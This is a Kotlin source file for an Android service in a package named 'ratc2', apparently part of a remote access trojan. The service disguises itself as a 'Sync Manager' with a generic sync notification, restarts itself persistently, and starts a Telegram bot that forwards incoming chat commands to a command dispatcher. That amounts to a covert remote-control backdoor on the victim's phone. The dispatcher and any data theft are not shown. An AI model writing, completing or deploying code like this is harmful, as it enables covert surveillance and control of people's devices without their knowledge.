package com.spud.ratc2

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class SyncService : Service() {
    private var bot: TelegramBot? = null
    private var thread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(1, notif())
        val dispatcher = CommandDispatcher(applicationContext)
        bot = TelegramBot(Config.BOT_TOKEN) { chat, cmd ->
            dispatcher.dispatch(chat, cmd)
        }
        thread = Thread { bot?.start() }.also { it.start() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        bot?.stop()
        thread?.interrupt()
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("bg", "Background",
                NotificationManager.IMPORTANCE_LOW)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
    }

    private fun notif(): Notification =
        NotificationCompat.Builder(this, "bg")
            .setContentTitle("Sync Manager")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
}
